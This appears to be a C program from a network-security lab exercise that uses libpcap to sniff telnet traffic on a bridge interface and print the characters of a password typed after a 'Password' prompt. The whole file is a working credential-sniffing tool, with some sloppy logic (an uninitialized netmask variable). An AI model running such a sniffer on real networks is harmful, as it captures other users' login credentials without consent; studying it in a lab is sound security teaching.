#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
// custom header file for a better readability of this file
#include "header.h" 

int is_pass = 0; // flag for the password

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
  const struct tcpheader *tcp;
  const char *payload;
  int size_ip;
  int size_tcp;
  int size_payload;

  struct ethheader *eth = (struct ethheader *)packet;

	if (ntohs(eth->ether_type) == 0x0800) { // 0x0800 is IPv4 type
		// getting the payload properly
    struct ipheader * ip = (struct ipheader *)(packet + sizeof(struct ethheader)); 
    size_ip = (((ip)->iph_ihl) & 0x0f)*4;
    tcp = (struct tcpheader*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);
    size_payload = ntohs(ip->iph_len) - (size_ip + size_tcp);
            
    if(size_payload > 0){ // checks payload size
    	if (is_pass){ // checks if the 'Password' is found in the last paylaod
    		for(int i=0; i < size_payload; i++){
				if(isalpha(*payload)){
					if(size_payload == 1) {
        				printf("%c", *payload); // prints the password one char at each time
        			}
        		}
        	payload++;
    		}
    		// after password entered, first payload has a size of 2
    		// checks this and sets the is_pass flag as False
    		// shows that the password is entered
    		if(size_payload == 2){
    			printf("\nPassword found.\n");
    			is_pass = 0;
    		}
   		}
   		// if 'Password' is in payload, sets the is_pass flag to True
    	if (payload == strstr(payload, "Password")){ 
    		is_pass = 1;
    		printf("Password: ");
    	}
		}
	}
}

int main()
{
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  char filter_exp[] = "tcp port telnet";
  bpf_u_int32 net;

  // Step 1: Open live pcap session on NIC with name br-82d5b13c1347
  handle = pcap_open_live("br-82d5b13c1347", BUFSIZ, 1, 1000, errbuf);

  // Step 2: Compile filter_exp into BPF psuedo-code
  pcap_compile(handle, &fp, filter_exp, 0, net);
  pcap_setfilter(handle, &fp);

  // Step 3: Capture packets
  pcap_loop(handle, -1, got_packet, NULL);

  pcap_close(handle);   //Close the handle
  return 0;
}
